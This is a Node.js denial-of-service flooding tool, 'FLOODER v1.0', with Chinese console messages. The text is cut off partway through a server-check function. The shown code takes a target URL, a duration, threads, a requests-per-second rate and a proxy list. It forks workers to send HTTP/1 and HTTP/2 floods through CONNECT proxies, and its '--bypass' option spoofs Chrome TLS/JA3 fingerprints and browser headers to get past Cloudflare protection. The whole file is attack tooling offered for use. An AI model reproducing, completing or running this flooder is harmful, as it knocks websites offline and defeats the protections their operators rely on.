const net = require("net");
const http2 = require("http2");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const https = require("https");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require("colors");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', function (er) {
});
process.on('unhandledRejection', function (er) {
});

const headers = {};

let proxyLoadInfoShown = false;
let globalProxies = null;

let totalRequests = 0;
let successCodes = {};
let lastStatus = "";
let pageTitle = "Unknown";

let useLocalTesting = false;
let localTestingResults = {
  success: false,
  title: "Unknown",
  status: "Unknown",
  lastChecked: 0
};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function getRandomPrivateIP() {
    const privateIPRanges = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"];
    const randomIPRange = privateIPRanges[Math.floor(Math.random() * privateIPRanges.length)];
    const ipParts = randomIPRange.split("/");
    const ipPrefix = ipParts[0].split(".");
    const subnetMask = parseInt(ipParts[1], 10);
    for (let i = 0; i < 4; i++) {
        if (subnetMask >= 8) {
            ipPrefix[i] = Math.floor(Math.random() * 256);
        } else if (subnetMask > 0) {
            const remainingBits = 8 - subnetMask;
            const randomBits = Math.floor(Math.random() * (1 << remainingBits));
            ipPrefix[i] &= ~(255 >> subnetMask);
            ipPrefix[i] |= randomBits;
            subnetMask -= remainingBits;
        } else {
            ipPrefix[i] = 0;
        }
    }
    return ipPrefix.join(".");
}

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    if (string.includes('\n')) {
        const lines = string.split('\n');
        lines.forEach(line => {
            console.log(`[${hours}:${minutes}:${seconds}]`.white + ` - ${line}`);
        });
    } else {
        console.log(`[${hours}:${minutes}:${seconds}]`.white + ` - ${string}`);
    }
}

function parseArgs() {
    const args = {};
    const flags = {};
    const processArgs = process.argv.slice(2);
    
    if (processArgs.length < 5) {
        return null;
    }
    
    args.target = processArgs[0];
    
    for (let i = 1; i < processArgs.length; i++) {
        const arg = processArgs[i];
        if (arg.startsWith('-time=')) {
            args.time = parseInt(arg.replace('-time=', ''));
        } else if (arg.startsWith('-thread=')) {
            args.threads = parseInt(arg.replace('-thread=', ''));
        } else if (arg.startsWith('-rps=')) {
            args.Rate = parseInt(arg.replace('-rps=', ''));
        } else if (arg.endsWith('.txt')) {
            args.proxyFile = arg;
        } else if (arg === '-bypass' || arg === '--bypass') {
            flags.bypass = 'true';
        } else if (arg === '-random' || arg === '--random') {
            flags.random = 'true';
        } else if (arg === '-debug' || arg === '--debug') {
            flags.debug = 'true';
        } else if (arg.startsWith('-delay=')) {
            flags.delay = arg.replace('-delay=', '');
        } else if (arg.startsWith('-version=')) {
            flags.version = arg.replace('-version=', '');
        }
    }
    
    return { args, flags };
}

function checkProxyFile(filePath) {
    try {
        const exists = fs.existsSync(filePath);
        if (!exists) {
            log("错误".red + " 代理文件不存在: " + filePath);
            return false;
        }
        
        const content = fs.readFileSync(filePath, 'utf8');
        const lines = content.split(/\r?\n/).filter(line => line.trim().length > 0);
        
        if (lines.length === 0) {
            log("错误".red + " 代理文件为空");
            return false;
        }
        
        globalProxies = lines;
        
        return true;
    } catch (err) {
        log("错误".red + " 读取代理文件失败: " + err.message);
        return false;
    }
}

const Socker = {
  HTTP: function(options, callback) {
    const socket = new net.Socket();
    socket.setTimeout(options.timeout || 5000);
    
    socket.on('error', function(err) {
      if (debug === 'true') {
        log("代理错误".red + " " + options.address + " - " + err.message);
      }
      callback(null, err);
      socket.destroy();
    });
    
    socket.on('timeout', function() {
      if (debug === 'true') {
        log("代理超时".yellow + " " + options.address);
      }
      callback(null, new Error('Connection timeout'));
      socket.destroy();
    });
    
    socket.connect(options.port, options.host, function() {
      socket.write(`CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\n\r\n`);
    });
    
    socket.once('data', function(data) {
      const statusLine = data.toString().split('\r\n')[0];
      const statusCode = parseInt(statusLine.split(' ')[1]);
      
      if (statusCode === 200) {
        callback(socket);
      } else {
        if (debug === 'true') {
          log("代理连接失败".red + " " + options.address + " - 状态码: " + statusCode);
        }
        callback(null, new Error(`CONNECT failed with status code: ${statusCode}`));
        socket.destroy();
      }
    });
  }
};

const parsedArgs = parseArgs();

if (!parsedArgs) {
    console.log("\n" + "─".repeat(50).cyan);
    log("FLOODER".cyan.bold + " - " + "v1.0".green + " Power by @MOemo888".gray);
    log("用法: ".white + "node flooder1.0.js <URL> -time=<秒> -thread=<线程> -rps=<每秒请求> <代理.txt> [--选项]".yellow);
    log("选项:".white);
    log("  --version   ".cyan + "- HTTP版本 (1/2/mix)");
    log("  --delay     ".cyan + "- 绕过速率限制的延迟(秒)");
    log("  --debug     ".cyan + "- 启用调试器");
    log("  --random    ".cyan + "- 随机请求路径");
    log("  --bypass    ".cyan + "- 绕过Cloudflare WAF");
    log("示例: ".white + "node flooder1.0.js https://example.com -time=60 -thread=5 -rps=100 proxies.txt --bypass".yellow);
    console.log("─".repeat(50).cyan + "\n");
    process.exit();
}

const args = parsedArgs.args;
const flags = parsedArgs.flags;

if (!args.target || !args.time || !args.threads || !args.Rate || !args.proxyFile) {
    log("错误".red + " 参数不完整，请检查格式");
    log("提示: node flooder1.0.js https://example.com -time=60 -thread=5 -rps=100 proxies.txt");
    process.exit(1);
}

try {
    const targetUrl = new URL(args.target);
} catch (err) {
    log("错误".red + " 无效的目标URL: " + args.target);
    process.exit(1);
}

if (!checkProxyFile(args.proxyFile)) {
    process.exit(1);
}

const delay = flags.delay ? parseInt(flags.delay) : 0;
const version = flags.version ? flags.version : 2;
const debug = flags.debug ? 'true' : 'false';
const random = flags.random ? 'true' : 'false';
const bypass = flags.bypass ? 'true' : 'false';

const chromeTlsFingerprints = {
    chrome120: {
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA",
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        groups: "X25519:P-256:P-384:P-521",
        honorCipherOrder: true
    },
    chrome133: {
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        groups: "X25519:P-256:P-384",
        honorCipherOrder: true
    },
    chrome135: {
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        groups: "X25519:P-256:P-384",
        honorCipherOrder: true
    },
    chrome136: {
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        groups: "X25519:P-256:P-384",
        honorCipherOrder: true
    },
    chrome137: {
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        groups: "X25519:P-256:P-384",
        honorCipherOrder: true,
        applicationMaxFragmentLength: 0x4000,
        ticketTimeoutSeconds: 172800,
        sessionIdContextMaxLen: 32,
        earlyData: true,
        postHandshakeAuth: true
    },
    chrome138: {
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        groups: "X25519:P-256:P-384",
        honorCipherOrder: true
    }
};

const chromeHTTP2Settings = {
    chrome120: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
    },
    chrome135: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
    },
    chrome136: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
    },
    chrome137: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
    },
    chrome138: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
    }
};

const chromeHTTP2Priorities = [
    { weight: 201, exclusive: false, parent: 0 },
    { weight: 101, exclusive: false, parent: 0 },
    { weight: 1, exclusive: false, parent: 0 }
];

const chromeJA3Fingerprints = {
    chrome120: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21-17513-41,29-23-24,0",
    chrome130: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21-17513,29-23-24,0",
    chrome133: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21-17513-41,29-23-24,0",
    chrome135: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21-17513-41-27,29-23-24,0",
    chrome136: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21-17513-41-27-31,29-23-24-25,0",
    chrome137: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21-17513-41-27-31,29-23-24-25-28,0",
    chrome138: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21-17513-41-27-31,29-23-24-25-28,0"
};

const chromeUserAgents = {
    chrome120: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ],
    chrome130: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
    ],
    chrome133: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
    ],
    chrome135: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
    ],
    chrome136: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
    ],
    chrome137: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    ],
    chrome138: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    ]
};

function isIP(str) {
    const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
    const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
    return ipv4Regex.test(str) || ipv6Regex.test(str);
}

if (cluster.isPrimary) {
    console.log("\n" + "─".repeat(50).cyan);
    console.log("  FLOODER v1.0 - Power by @MOemo888 ".bgCyan.black);
    console.log("─".repeat(50).cyan);
    console.log("  目标: ".cyan + args.target);
    console.log("  时间: ".cyan + args.time + "秒" + " | 线程: ".cyan + args.threads + " | RPS: ".cyan + args.Rate);
    
    let enabledOptions = [];
    if (bypass === 'true') enabledOptions.push("CF绕过".green);
    if (random === 'true') enabledOptions.push("随机路径".green);
    if (debug === 'true') enabledOptions.push("调试".yellow);
    
    if (enabledOptions.length > 0) {
        console.log("  选项: ".cyan + enabledOptions.join(" | "));
    }
    
    console.log("─".repeat(50).cyan + "\n");

    const info = {
        "Target": args.target,
        "Duration": args.time,
        "Threads": args.threads,
        "RPS": args.Rate,
        "optional": {
            "Delay": delay,
            "Version": version,
            "Debug": debug,
            "Random": random,
            "Bypass": bypass
        }
    }

    if (debug === 'true') {
        if (bypass === 'true') {
            log("DEBUG".cyan + " CloudFlare绕过模式: 使用增强的Chrome指纹和头部特性");
        }
        log("DEBUG".cyan + " 接收到的命令行参数: " + JSON.stringify(process.argv.slice(2)));
        log("DEBUG".cyan + " 解析后的标志: " + JSON.stringify(flags));
    }
    
    log("状态".cyan + ": " + "连接中...".yellow);
    
    setTimeout(() => {
        checkServerDirectly();
        
        setInterval(() => {
            checkServerDirectly();
        }, 30000);
    }, 1000);
    
    cluster.on('message', (worker, message) => {
        if (message.type === 'status_update') {
            if (message.status) {
                if (!successCodes[message.status]) {
                    successCodes[message.status] = 0;
                }
                successCodes[message.status]++;
                totalRequests++;
                
                if (successCodes[message.status] % 10 === 0) {
                    lastStatus = message.status;
                }
            }
            
            if (message.title && message.title !== "Unknown") {
                pageTitle = message.title;
            }
        }
    });
    
    proxyLoadInfoShown = true;
    
    setInterval(() => {
        if (totalRequests > 0) {
            let maxCode = "";
            let maxCount = 0;
            for (const code in successCodes) {
                if (successCodes[code] > maxCount) {
                    maxCode = code;
                    maxCount = successCodes[code];
                }
            }
            
            log("Title".yellow + ": " + (pageTitle !== "Unknown" ? pageTitle : args.target) + 
                " | " + "status".magenta + ": " + (maxCode || "等待中") + 
                " | " + "Total Request".cyan + ": " + totalRequests);
        }
    }, 10000);
    
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker, code, signal) => {
        log("警告".yellow + " 工作线程 #" + worker.id + " 退出");
    });

    setTimeout(() => {
        console.log("─".repeat(50).cyan);
        log("攻击完成".green + " - " + "目标: ".cyan + args.target + " - " + "持续: ".cyan + args.time + "秒");
        console.log("─".repeat(50).cyan);
        
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        
        setTimeout(() => {
            process.exit(0);
        }, 1000);
    }, args.time * 1000);
} else {
    let sentRequests = 0;
    let successRequests = 0;
    let failedRequests = 0;
    
    setInterval(() => {
        if (debug === 'true') {
            log("统计".cyan + " 工作线程 #" + cluster.worker.id + 
                " 已发送: " + sentRequests + 
                " 成功: " + successRequests + 
                " 失败: " + failedRequests);
        }
    }, 5000);
    
    var proxies = globalProxies;
    if (!proxies) {
        try {
            proxies = readLines(args.proxyFile);
        } catch (err) {
            log("错误".red + " 工作线程 #" + cluster.worker.id + " 读取代理失败: " + err.message);
            process.exit(1);
        }
    }
    
    const parsedTarget = url.parse(args.target);
    
    if (version === '2' || version === 2) {
        setInterval(() => {
            http2run();
        }, Number(delay) * 1000 || 100);
    } else if (version === '1' || version === 1) {
        setInterval(() => {
            http1run();
        }, Number(delay) * 1000 || 100);
    } else {
        setInterval(() => {
            http1run();
            http2run();
        }, Number(delay) * 1000 || 100);
    }

    setTimeout(() => {
        if (failedRequests > 10 && !localTestingResults.success) {
            checkServerDirectly();
        }
    }, 10000);
}

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
const parsedTarget = url.parse(args.target);

const headerBuilder = {
    userAgent: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    ],

    acceptLang: [
        'en-US,en;q=0.9',
        'en-GB,en;q=0.9',
        'en-CA,en;q=0.9',
        'en-AU,en;q=0.9',
        'zh-CN,zh;q=0.9,en;q=0.8',
        'zh-TW,zh;q=0.9,en;q=0.8',
        'ja-JP,ja;q=0.9,en;q=0.8',
        'ko-KR,ko;q=0.9,en;q=0.8'
    ],

    acceptEncoding: [
        'gzip, deflate, br',
        'br, gzip, deflate',
        'gzip, deflate, br, zstd'
    ],

    accept: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    ],

    secFetch: {
        site: ['none', 'same-origin', 'same-site', 'cross-site'],
        mode: ['navigate', 'cors', 'no-cors', 'same-origin'],
        dest: ['document', 'image', 'style', 'script', 'font', 'manifest'],
        user: ['?1', '?0']
    },

    priority: [
        'u=1, i',
        'u=3, i',
        'u=0, i'
    ],

    viewport: [
        '1920x1080',
        '1366x768',
        '1536x864',
        '1440x900',
        '1280x720'
    ],

    platform: [
        'Windows',
        'macOS',
        'Linux'
    ],

    connection: [
        'keep-alive'
    ],

    cacheControl: [
        'max-age=0',
        'no-cache'
    ],
    
    chromeUA: {
        chrome137: {
            ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            secChUa: '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            secChUaFullVersion: "137.0.7151.41",
            secChUaFullVersionList: '"Google Chrome";v="137.0.7151.41", "Chromium";v="137.0.7151.41", "Not/A)Brand";v="24.0.0.0"',
            secChUaPlatformVersion: "19.0.0",
            secChUaArch: "x86",
            secChUaBitness: "64",
            secChUaMobile: "?0",
            secChUaModel: "",
            secChUaPlatform: "Windows",
            acceptLanguage: "zh-CN,zh;q=0.9,en;q=0.8",
            acceptEncoding: "gzip, deflate, br, zstd",
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            cacheControl: "max-age=0",
            priority: "u=0, i"
        },
        chrome138: {
            ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            secChUa: '"Google Chrome";v="138", "Chromium";v="138", "Not/A)Brand";v="24"',
            secChUaFullVersion: "138.0.0.0",
            secChUaFullVersionList: '"Google Chrome";v="138.0.0.0", "Chromium";v="138.0.0.0", "Not/A)Brand";v="24.0.0.0"',
            secChUaPlatformVersion: "19.0.0"
        }
    }
};

function extractPageTitle(htmlContent) {
    if (!htmlContent) return "Unknown";
    
    try {
        if (debug === 'true') {
            const contentPreview = htmlContent.substring(0, 200) + "...";
            log("调试".cyan + " HTML预览: " + contentPreview);
        }
        
        const titleRegex = /<title[^>]*>([\s\S]*?)<\/title>/i;
        const titleMatch = htmlContent.match(titleRegex);
        
        if (titleMatch && titleMatch[1]) {
            const title = titleMatch[1].trim();
            
            if (debug === 'true') {
                log("调试".cyan + " 提取到标题: " + title);
            }
            
            return title;
        }
        
        const metaTitleRegex = /<meta[^>]*property=["']og:title["'][^>]*content=["']([^"']*)["'][^>]*>/i;
        const metaMatch = htmlContent.match(metaTitleRegex);
        
        if (metaMatch && metaMatch[1]) {
            const metaTitle = metaMatch[1].trim();
            if (debug === 'true') {
                log("调试".cyan + " 从meta标签提取标题: " + metaTitle);
            }
            return metaTitle;
        }
        
        if (debug === 'true') {
            log("调试".red + " 无法提取标题，返回Unknown");
        }
    } catch (error) {
        if (debug === 'true') {
            log("错误".red + " 标题提取失败: " + error.message);
        }
    }
    
    return "Unknown";
}

function checkServerDirectly() {
  if (typeof headerBuilder === 'undefined') {
    log("本机测试".red + " 失败: headerBuilder尚未初始化");
    return;
  }
  
  const now = Date.now();
  if (now - localTestingResults.lastChecked < 30000) {
    return;
  }
  
  localTestingResults.lastChecked = now;
  
  try {
    if (typeof args === 'undefined' || !args || !args.target) {
      log("本机测试".red + " 失败: 目标URL尚未初始化");
      return;
    }
    
    const parsedUrl = new URL(args.target);
    
    const chromeFingerprint = generateChromeFingerprint();
    
    const headers = {
      'User-Agent': chromeFingerprint.userAgent,
      'Accept': randomElement(headerBuilder.accept),
      'Accept-Language': randomElement(headerBuilder.acceptLang),
      'Accept-Encoding': 'identity',
      'Cache-Control': randomElement(headerBuilder.cacheControl),
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1',
      'Sec-Ch-Ua': `"Not_A Brand";v="8", "Chromium";v="${chromeFingerprint.version}", "Google Chrome";v="${chromeFingerprint.version}"`,
      'Sec-Ch-Ua-Mobile': '?0',
